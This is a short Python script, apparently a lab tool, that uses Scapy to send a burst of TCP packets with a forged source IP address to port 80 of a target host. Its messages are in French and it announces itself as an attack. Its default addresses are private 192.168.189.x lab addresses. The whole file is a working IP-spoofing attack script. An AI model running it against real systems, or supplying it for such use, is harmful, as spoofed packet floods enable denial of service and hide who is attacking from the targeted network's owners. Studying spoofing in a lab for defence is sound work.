#!/usr/bin/env python3
from scapy.all import *
import sys

def ip_spoofing(src_ip, dst_ip, count=100, interface="eth0"):
    print(f"[*] IP Spoofing: {src_ip} -> {dst_ip}")
    print(f"[*] Envoi de {count} paquets...")
    
    packets = [IP(src=src_ip, dst=dst_ip)/TCP(sport=12345, dport=80)/Raw(load="GET / HTTP/1.1\r\n\r\n") 
               for _ in range(count)]
    
    send(packets, iface=interface, verbose=False)
    print("[*] Attaque terminee")

if __name__ == "__main__":
    src = sys.argv[1] if len(sys.argv) > 1 else "192.168.189.200"
    dst = sys.argv[2] if len(sys.argv) > 2 else "192.168.189.201"
    count = int(sys.argv[3]) if len(sys.argv) > 3 else 100
    ip_spoofing(src, dst, count)
